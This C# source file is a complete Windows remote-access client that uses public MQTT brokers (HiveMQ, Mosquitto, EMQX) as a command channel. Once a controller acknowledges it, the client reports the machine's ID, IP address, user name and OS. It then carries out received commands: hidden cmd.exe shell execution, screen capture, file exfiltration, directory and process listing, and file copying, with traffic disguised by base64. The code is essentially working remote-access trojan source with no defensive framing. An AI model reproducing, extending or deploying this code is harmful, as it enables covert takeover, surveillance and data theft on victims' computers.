using MQTTnet;
using MQTTnet.Client;
using MQTTnet.Protocol;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    internal class Program
    {
        private static IMqttClient _client;
        private static MqttClientOptions _options;
        private static readonly SemaphoreSlim _connectionLock = new SemaphoreSlim(1, 1);
        private static bool _isReconnecting = false;
        private static CancellationTokenSource _cts = new CancellationTokenSource();

        private static readonly (string Host, int Port)[] Brokers = {
            ("broker.hivemq.com", 1883),
            ("test.mosquitto.org", 1883),
            ("broker.emqx.io", 1883)
        };

        private static int _currentBrokerIndex = 0;
        private static DateTime _lastPrimaryCheckTime = DateTime.MinValue;
        private static readonly TimeSpan PrimaryCheckInterval = TimeSpan.FromMinutes(1);
        private static readonly TimeSpan HeartbeatInterval = TimeSpan.FromSeconds(10);
        private static readonly TimeSpan ReconnectInterval = TimeSpan.FromSeconds(5);

        private static Dictionary<string, PendingMessage> _pendingMessages = new Dictionary<string, PendingMessage>();
        private static readonly TimeSpan MessageTimeout = TimeSpan.FromSeconds(60);

        private static readonly string ClientId = GetUUID();
        private static readonly string C2S = $"demo/c2s/{ClientId}";
        private static readonly string S2C = $"demo/s2c/{ClientId}";
        private static readonly string C2S_ACK = $"demo/c2s/{ClientId}/ack";
        private static readonly string S2C_ACK = $"demo/s2c/{ClientId}/ack";

        private static string _tempDir;

        // Command execution control
        private static bool _isExecutingCommand = false;
        private static Process _currentProcess = null;
        private static readonly object _commandLock = new object();
        private static Queue<CommandRequest> _commandQueue = new Queue<CommandRequest>();

        // Heartbeat control - FIXED APPROACH
        private static bool _serverAcknowledged = false;
        private static bool _initialInfoSent = false;
        private static DateTime _lastHeartbeatAckTime = DateTime.MinValue;
        private static readonly TimeSpan HeartbeatAckTimeout = TimeSpan.FromSeconds(30); // If no ACK for 30s, server is offline

        static async Task Main(string[] args)
        {
            Console.WriteLine("=== MQTT Client ===");
            Console.WriteLine($"Client ID: {ClientId}");

            InitializeTempDirectory();

            var factory = new MqttFactory();
            _client = factory.CreateMqttClient();

            _client.ApplicationMessageReceivedAsync += OnMessageReceived;
            _client.DisconnectedAsync += OnDisconnected;
            _client.ConnectedAsync += OnConnected;

            await ConnectWithPriorityFailover();

            _ = Task.Run(PrimaryBrokerCheckLoop);
            _ = Task.Run(MessageRetryLoop);
            _ = Task.Run(HeartbeatLoop);
            _ = Task.Run(PersistentReconnectLoop);
            _ = Task.Run(CommandExecutionLoop);
            _ = Task.Run(HeartbeatMonitorLoop); // NEW: Monitor heartbeat ACKs

            Console.WriteLine("\nClient running... Press Ctrl+C to exit");

            while (!_cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
            }

            _cts.Cancel();
            if (_client.IsConnected)
            {
                await _client.DisconnectAsync();
            }
            _client?.Dispose();
        }

        private static void InitializeTempDirectory()
        {
            try
            {
                _tempDir = Path.Combine(Path.GetTempPath(), "BeeHive_" + ClientId);
                Directory.CreateDirectory(_tempDir);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error creating temp directory: {ex.Message}");
            }
        }

        // ================= COMMAND EXECUTION QUEUE =================

        private static async Task CommandExecutionLoop()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(100, _cts.Token);

                    CommandRequest cmdReq = null;
                    lock (_commandLock)
                    {
                        if (_commandQueue.Count > 0 && !_isExecutingCommand)
                        {
                            cmdReq = _commandQueue.Dequeue();
                            _isExecutingCommand = true;
                        }
                    }

                    if (cmdReq != null)
                    {
                        Console.WriteLine($"🔨 Executing: {cmdReq.Command}");
                        string response = await ProcessCommand(cmdReq.Command);

                        lock (_commandLock)
                        {
                            _isExecutingCommand = false;
                        }

                        await SendToServerWithRetry(response);
                        Console.WriteLine($"✓ Command completed");

                        await SendAck(C2S_ACK, cmdReq.OriginalPayload);
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"✗ Command execution error: {ex.Message}");
                    lock (_commandLock)
                    {
                        _isExecutingCommand = false;
                    }
                }
            }
        }

        private static async Task PersistentReconnectLoop()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(ReconnectInterval, _cts.Token);

                    if (!_client.IsConnected && !_isReconnecting)
                    {
                        _ = Task.Run(async () => await ConnectWithPriorityFailover());
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch { }
            }
        }

        // ================= HEARTBEAT SYSTEM =================

        private static async Task HeartbeatLoop()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(HeartbeatInterval, _cts.Token);

                    if (_client?.IsConnected == true)
                    {
                        string heartbeat = "PING";
                        await SendHeartbeatPing(heartbeat);
                        Console.WriteLine("💓 Heartbeat ping sent");
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch { }
            }
        }

        // NEW: Monitor heartbeat ACKs to detect server offline
        private static async Task HeartbeatMonitorLoop()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(5000, _cts.Token); // Check every 5 seconds

                    if (_client?.IsConnected == true && _lastHeartbeatAckTime != DateTime.MinValue)
                    {
                        var timeSinceLastAck = DateTime.Now - _lastHeartbeatAckTime;

                        if (timeSinceLastAck > HeartbeatAckTimeout)
                        {
                            // No ACK for 30 seconds - server is offline!
                            if (_serverAcknowledged)
                            {
                                Console.WriteLine("⚠ No heartbeat ACK received - server appears offline");
                                _serverAcknowledged = false;
                                _initialInfoSent = false;
                            }
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch { }
            }
        }

        private static async Task SendHeartbeatPing(string data)
        {
            if (!_client.IsConnected) return;

            string messageId = "HB" + Guid.NewGuid().ToString("N").Substring(0, 6);

            try
            {
                string fullPayload = $"{messageId}|{data}";
                string encodedPayload = EncodeToBase64(fullPayload);

                var message = new MqttApplicationMessageBuilder()
                    .WithTopic(C2S)
                    .WithPayload(encodedPayload)
                    .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtMostOnce)
                    .WithRetainFlag(false)
                    .Build();

                await _client.PublishAsync(message, _cts.Token);
            }
            catch { }
        }

        // ================= CONNECTION MANAGEMENT =================

        private static async Task ConnectWithPriorityFailover()
        {
            await _connectionLock.WaitAsync();
            try
            {
                if (_client.IsConnected)
                {
                    return;
                }

                _isReconnecting = true;

                if (await TryConnectToBroker(0, attempts: 3, timeoutSeconds: 10))
                {
                    _currentBrokerIndex = 0;
                    _isReconnecting = false;

                    // Reset flags on new connection
                    _serverAcknowledged = false;
                    _initialInfoSent = false;
                    _lastHeartbeatAckTime = DateTime.MinValue;

                    return;
                }

                for (int i = 1; i < Brokers.Length; i++)
                {
                    if (await TryConnectToBroker(i, attempts: 1, timeoutSeconds: 5))
                    {
                        _currentBrokerIndex = i;
                        _lastPrimaryCheckTime = DateTime.Now;
                        _isReconnecting = false;

                        _serverAcknowledged = false;
                        _initialInfoSent = false;
                        _lastHeartbeatAckTime = DateTime.MinValue;

                        return;
                    }
                }

                _isReconnecting = false;
            }
            finally
            {
                _connectionLock.Release();
            }
        }

        private static async Task<bool> TryConnectToBroker(int brokerIndex, int attempts, int timeoutSeconds)
        {
            var broker = Brokers[brokerIndex];

            for (int attempt = 1; attempt <= attempts; attempt++)
            {
                try
                {
                    _options = new MqttClientOptionsBuilder()
                        .WithClientId(ClientId)
                        .WithTcpServer(broker.Host, broker.Port)
                        .WithKeepAlivePeriod(TimeSpan.FromSeconds(30))
                        .WithTimeout(TimeSpan.FromSeconds(timeoutSeconds))
                        .WithCleanSession(false)
                        .WithProtocolVersion(MQTTnet.Formatter.MqttProtocolVersion.V311)
                        .Build();

                    var connectResult = await _client.ConnectAsync(_options, _cts.Token);

                    if (connectResult.ResultCode == MqttClientConnectResultCode.Success)
                    {
                        await SubscribeToTopics();
                        return true;
                    }
                }
                catch { }

                if (attempt < attempts)
                {
                    await Task.Delay(1000);
                }
            }

            return false;
        }

        private static async Task PrimaryBrokerCheckLoop()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(30000, _cts.Token);

                    if (_currentBrokerIndex != 0)
                    {
                        var timeSince = DateTime.Now - _lastPrimaryCheckTime;

                        if (timeSince >= PrimaryCheckInterval)
                        {
                            if (await IsPrimaryBrokerAvailable())
                            {
                                await SwitchToPrimaryBroker();
                            }
                            else
                            {
                                _lastPrimaryCheckTime = DateTime.Now;
                            }
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch { }
            }
        }

        private static async Task<bool> IsPrimaryBrokerAvailable()
        {
            try
            {
                using (var testClient = new MqttFactory().CreateMqttClient())
                {
                    var testOptions = new MqttClientOptionsBuilder()
                        .WithClientId(ClientId + "-test")
                        .WithTcpServer(Brokers[0].Host, Brokers[0].Port)
                        .WithTimeout(TimeSpan.FromSeconds(5))
                        .Build();

                    var result = await testClient.ConnectAsync(testOptions);

                    if (result.ResultCode == MqttClientConnectResultCode.Success)
                    {
                        await testClient.DisconnectAsync();
                        return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static async Task SwitchToPrimaryBroker()
        {
            await _connectionLock.WaitAsync();
            try
            {
                if (_client.IsConnected)
                {
                    await _client.DisconnectAsync();
                }

                if (await TryConnectToBroker(0, attempts: 2, timeoutSeconds: 10))
                {
                    _currentBrokerIndex = 0;
                }
                else
                {
                    await ConnectWithPriorityFailover();
                }
            }
            finally
            {
                _connectionLock.Release();
            }
        }

        // ================= MESSAGE HANDLING =================

        private static async Task SendToServerWithRetry(string data)
        {
            if (!_client.IsConnected)
            {
                Console.WriteLine("✗ Cannot send: Not connected");
                return;
            }

            string messageId = Guid.NewGuid().ToString("N").Substring(0, 8);

            var pendingMsg = new PendingMessage
            {
                Id = messageId,
                Payload = data,
                Topic = C2S,
                SentTime = DateTime.Now,
                RetryCount = 0
            };

            _pendingMessages[messageId] = pendingMsg;

            try
            {
                string fullPayload = $"{messageId}|{data}";
                string encodedPayload = EncodeToBase64(fullPayload);

                var message = new MqttApplicationMessageBuilder()
                    .WithTopic(C2S)
                    .WithPayload(encodedPayload)
                    .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce)
                    .WithRetainFlag(false)
                    .Build();

                await _client.PublishAsync(message, _cts.Token);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"✗ Error sending: {ex.Message}");
            }
        }

        private static async Task MessageRetryLoop()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(10000, _cts.Token);

                    var now = DateTime.Now;
                    var timedOut = _pendingMessages.Values
                        .Where(m => (now - m.SentTime) > MessageTimeout && !m.AckReceived)
                        .ToList();

                    foreach (var msg in timedOut)
                    {
                        msg.RetryCount++;

                        if (msg.RetryCount > 2)
                        {
                            _pendingMessages.Remove(msg.Id);
                            continue;
                        }

                        try
                        {
                            string fullPayload = $"{msg.Id}|{msg.Payload}";
                            string encodedPayload = EncodeToBase64(fullPayload);

                            var message = new MqttApplicationMessageBuilder()
                                .WithTopic(msg.Topic)
                                .WithPayload(encodedPayload)
                                .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce)
                                .Build();

                            await _client.PublishAsync(message, _cts.Token);
                            msg.SentTime = DateTime.Now;
                        }
                        catch { }
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch { }
            }
        }

        private static async Task SubscribeToTopics()
        {
            try
            {
                var subscribeOptions = new MqttClientSubscribeOptionsBuilder()
                    .WithTopicFilter(f => f.WithTopic(S2C).WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce))
                    .WithTopicFilter(f => f.WithTopic(S2C_ACK).WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce))
                    .Build();

                await _client.SubscribeAsync(subscribeOptions);
            }
            catch { }
        }

        private static Task OnConnected(MqttClientConnectedEventArgs e)
        {
            Console.WriteLine("✓ Connected");
            return Task.CompletedTask;
        }

        private static Task OnDisconnected(MqttClientDisconnectedEventArgs e)
        {
            Console.WriteLine($"⚠ Disconnected from broker");

            // Reset flags when broker connection lost
            _serverAcknowledged = false;
            _initialInfoSent = false;
            _lastHeartbeatAckTime = DateTime.MinValue;

            return Task.CompletedTask;
        }

        private static async Task OnMessageReceived(MqttApplicationMessageReceivedEventArgs e)
        {
            try
            {
                string topic = e.ApplicationMessage.Topic;
                string payload = Encoding.UTF8.GetString(e.ApplicationMessage.Payload);

                if (topic == S2C)
                {
                    string decodedPayload = DecodeFromBase64(payload);
                    var parts = decodedPayload.Split(new[] { '|' }, 2);
                    string messageId = parts.Length > 0 ? parts[0] : "";
                    string command = parts.Length > 1 ? parts[1] : decodedPayload;

                    Console.WriteLine($"📨 Command: {command}");

                    lock (_commandLock)
                    {
                        _commandQueue.Enqueue(new CommandRequest
                        {
                            Command = command,
                            OriginalPayload = payload
                        });

                        Console.WriteLine($"📋 Queued (queue: {_commandQueue.Count})");
                    }
                }
                else if (topic == S2C_ACK)
                {
                    string decodedAck = DecodeFromBase64(payload);
                    var parts = decodedAck.Split(new[] { '|' }, 2);
                    string messageId = parts.Length > 0 ? parts[0] : "";
                    string ackData = parts.Length > 1 ? parts[1] : "";

                    // Check if this is ACK for heartbeat
                    if (messageId.StartsWith("HB") && ackData == "PING")
                    {
                        // Update last ACK time
                        _lastHeartbeatAckTime = DateTime.Now;

                        if (!_serverAcknowledged)
                        {
                            _serverAcknowledged = true;
                            Console.WriteLine("✓ Server ACK received - sending initial info");

                            if (!_initialInfoSent)
                            {
                                string localIp = GetLocalIPAddress();
                                string info = $"{ClientId}#{localIp}#{Environment.UserName}#{GetWindowsVersion()}";
                                await SendToServerWithRetry(info);
                                _initialInfoSent = true;
                            }
                        }
                    }
                    else
                    {
                        HandleAck(decodedAck);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"✗ Error: {ex.Message}");
            }
        }

        private static void HandleAck(string ackPayload)
        {
            try
            {
                var parts = ackPayload.Split(new[] { '|' }, 2);
                if (parts.Length >= 1)
                {
                    string messageId = parts[0];

                    if (_pendingMessages.ContainsKey(messageId))
                    {
                        _pendingMessages[messageId].AckReceived = true;
                        _pendingMessages.Remove(messageId);
                    }
                }
            }
            catch { }
        }

        private static async Task SendAck(string topic, string originalPayload)
        {
            try
            {
                var ackMessage = new MqttApplicationMessageBuilder()
                    .WithTopic(topic)
                    .WithPayload(originalPayload)
                    .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce)
                    .Build();

                await _client.PublishAsync(ackMessage, _cts.Token);
            }
            catch { }
        }

        // ================= COMMAND PROCESSING =================

        private static async Task<string> ProcessCommand(string command)
        {
            try
            {
                command = command.Trim();
                string cmd = command.Split(' ')[0].ToLower();
                string args = command.Contains(' ') ? command.Substring(command.IndexOf(' ') + 1).Trim() : "";

                if (cmd == "dir")
                {
                    string path = string.IsNullOrEmpty(args) ? Environment.CurrentDirectory : args.Trim('"');
                    return ListDirectory(path);
                }
                else if (cmd == "whoami")
                {
                    return GetCurrentUser();
                }
                else if (cmd == "tasklist")
                {
                    return await RunCommandComplete("tasklist", 30);
                }
                else if (cmd == "screenshot")
                {
                    return await TakeScreenshot();
                }
                else if (cmd == "systeminfo")
                {
                    return GetSystemInfo();
                }
                else if (command.StartsWith("shell:", StringComparison.OrdinalIgnoreCase) ||
                         command.StartsWith("shell ", StringComparison.OrdinalIgnoreCase))
                {
                    string shellCmd = command.Contains(':') ?
                        command.Substring(command.IndexOf(':') + 1).Trim() :
                        command.Substring(command.IndexOf(' ') + 1).Trim();
                    return await RunCommandComplete(shellCmd, 180);
                }
                else if (cmd == "download")
                {
                    string filePath = args.Trim('"');
                    return await DownloadFile(filePath);
                }
                else if (cmd == "upload")
                {
                    return await UploadFile(args);
                }
                else
                {
                    return $"Unknown command: {command}";
                }
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }

        private static async Task<string> RunCommandComplete(string command, int timeoutSeconds)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    _currentProcess = process;

                    var outputTask = process.StandardOutput.ReadToEndAsync();
                    var errorTask = process.StandardError.ReadToEndAsync();

                    bool completed = process.WaitForExit(timeoutSeconds * 1000);

                    string output = "";
                    string error = "";

                    if (completed)
                    {
                        output = await outputTask;
                        error = await errorTask;
                    }
                    else
                    {
                        try
                        {
                            process.Kill();
                            output = $"[TIMEOUT] Process killed after {timeoutSeconds} seconds";
                        }
                        catch { }
                    }

                    _currentProcess = null;

                    string result = output;
                    if (!string.IsNullOrEmpty(error))
                    {
                        result += "\r\n[ERROR]\r\n" + error;
                    }

                    return string.IsNullOrEmpty(result) ? "Command executed (no output)" : result;
                }
            }
            catch (Exception ex)
            {
                _currentProcess = null;
                return $"Shell error: {ex.Message}";
            }
        }

        private static async Task<string> TakeScreenshot()
        {
            try
            {
                return await Task.Run(() => {
                    Rectangle bounds = Screen.PrimaryScreen.Bounds;
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }

                        string filename = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png";
                        string tempPath = Path.Combine(_tempDir, filename);

                        bitmap.Save(tempPath, ImageFormat.Png);

                        byte[] imageBytes = File.ReadAllBytes(tempPath);
                        string base64Image = Convert.ToBase64String(imageBytes);

                        try { File.Delete(tempPath); } catch { }

                        return $"SCREENSHOT:{filename}:{base64Image}";
                    }
                });
            }
            catch (Exception ex)
            {
                return $"Screenshot error: {ex.Message}";
            }
        }

        private static async Task<string> DownloadFile(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    return $"File not found: {filePath}";
                }

                FileInfo fi = new FileInfo(filePath);

                if (fi.Length > 50 * 1024 * 1024)
                {
                    return $"File too large: {fi.Length / (1024 * 1024)}MB. Maximum: 50MB";
                }

                byte[] fileBytes = File.ReadAllBytes(filePath);
                string base64Data = Convert.ToBase64String(fileBytes);

                return $"FILE:{fi.Name}:{base64Data}";
            }
            catch (Exception ex)
            {
                return $"Download error: {ex.Message}";
            }
        }

        private static async Task<string> UploadFile(string data)
        {
            try
            {
                List<string> paths = new List<string>();

                if (data.Contains("\""))
                {
                    int start = -1;
                    for (int i = 0; i < data.Length; i++)
                    {
                        if (data[i] == '"')
                        {
                            if (start == -1)
                            {
                                start = i + 1;
                            }
                            else
                            {
                                paths.Add(data.Substring(start, i - start));
                                start = -1;
                            }
                        }
                    }
                }
                else
                {
                    paths = data.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries).ToList();
                }

                if (paths.Count < 2)
                {
                    return "Invalid upload format";
                }

                string sourcePath = paths[0];
                string destPath = paths[1];

                if (!File.Exists(sourcePath))
                {
                    return $"Source not found: {sourcePath}";
                }

                string destDir = Path.GetDirectoryName(destPath);
                if (!string.IsNullOrEmpty(destDir) && !Directory.Exists(destDir))
                {
                    Directory.CreateDirectory(destDir);
                }

                File.Copy(sourcePath, destPath, true);

                return $"Uploaded:\r\nFrom: {sourcePath}\r\nTo: {destPath}";
            }
            catch (Exception ex)
            {
                return $"Upload error: {ex.Message}";
            }
        }

        private static string GetSystemInfo()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("=== SYSTEM INFORMATION ===");
                sb.AppendLine($"Computer: {Environment.MachineName}");
                sb.AppendLine($"User: {Environment.UserName}");
                sb.AppendLine($"OS: {GetWindowsVersion()}");
                sb.AppendLine($"Architecture: {(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")}");
                sb.AppendLine($"Processors: {Environment.ProcessorCount}");

                try
                {
                    using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem"))
                    {
                        foreach (ManagementObject obj in searcher.Get())
                        {
                            ulong totalMem = Convert.ToUInt64(obj["TotalVisibleMemorySize"]) / 1024;
                            ulong freeMem = Convert.ToUInt64(obj["FreePhysicalMemory"]) / 1024;
                            sb.AppendLine($"Total Memory: {totalMem} MB");
                            sb.AppendLine($"Free Memory: {freeMem} MB");
                        }
                    }
                }
                catch { }

                return sb.ToString();
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }

        private static string ListDirectory(string path)
        {
            try
            {
                if (!Directory.Exists(path))
                {
                    return $"Not found: {path}";
                }

                StringBuilder result = new StringBuilder();
                result.AppendLine($"Directory of {path}");
                result.AppendLine();

                var dirs = Directory.GetDirectories(path);
                var files = Directory.GetFiles(path);

                foreach (var dir in dirs)
                {
                    DirectoryInfo di = new DirectoryInfo(dir);
                    result.AppendLine($"{di.LastWriteTime:dd-MM-yyyy  HH:mm}    <DIR>          {di.Name}");
                }

                long totalSize = 0;
                foreach (var file in files)
                {
                    FileInfo fi = new FileInfo(file);
                    result.AppendLine($"{fi.LastWriteTime:dd-MM-yyyy  HH:mm}              {fi.Length,14:N0} {fi.Name}");
                    totalSize += fi.Length;
                }

                result.AppendLine($"               {files.Length} File(s)  {totalSize,14:N0} bytes");
                result.AppendLine($"               {dirs.Length} Dir(s)");

                return result.ToString();
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }

        private static string GetCurrentUser()
        {
            try
            {
                string domain = Environment.UserDomainName;
                string user = Environment.UserName;
                return $"{domain}\\{user}";
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }

        private static string EncodeToBase64(string plainText)
        {
            try
            {
                byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);
                return Convert.ToBase64String(plainTextBytes);
            }
            catch
            {
                return plainText;
            }
        }

        private static string DecodeFromBase64(string base64Text)
        {
            try
            {
                byte[] base64Bytes = Convert.FromBase64String(base64Text);
                return Encoding.UTF8.GetString(base64Bytes);
            }
            catch
            {
                return base64Text;
            }
        }

        private static string GetLocalIPAddress()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                var ip = host.AddressList.FirstOrDefault(x => x.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(x));
                return ip?.ToString() ?? "0.0.0.0";
            }
            catch
            {
                return "0.0.0.0";
            }
        }

        public static string GetUUID()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string uuidStr = obj["UUID"]?.ToString();
                        if (!string.IsNullOrEmpty(uuidStr))
                        {
                            return uuidStr.Split('-')[0];
                        }
                    }
                }
            }
            catch { }

            return Guid.NewGuid().ToString("N").Substring(0, 8);
        }

        public static string GetWindowsVersion()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string caption = obj["Caption"]?.ToString() ?? "Unknown";
                        if (caption.Contains("11")) return "Windows 11";
                        if (caption.Contains("10")) return "Windows 10";
                        if (caption.Contains("8.1")) return "Windows 8.1";
                        if (caption.Contains("8")) return "Windows 8";
                        if (caption.Contains("7")) return "Windows 7";
                        return caption.Replace("Microsoft ", "").Trim();
                    }
                }
            }
            catch { }

            return $"Windows {Environment.OSVersion.Version.Major}.{Environment.OSVersion.Version.Minor}";
        }
    }

    public class PendingMessage
    {
        public string Id { get; set; }
        public string Payload { get; set; }
        public string Topic { get; set; }
        public DateTime SentTime { get; set; }
        public int RetryCount { get; set; }
        public bool AckReceived { get; set; }
    }

    public class CommandRequest
    {
        public string Command { get; set; }
        public string OriginalPayload { get; set; }
    }
}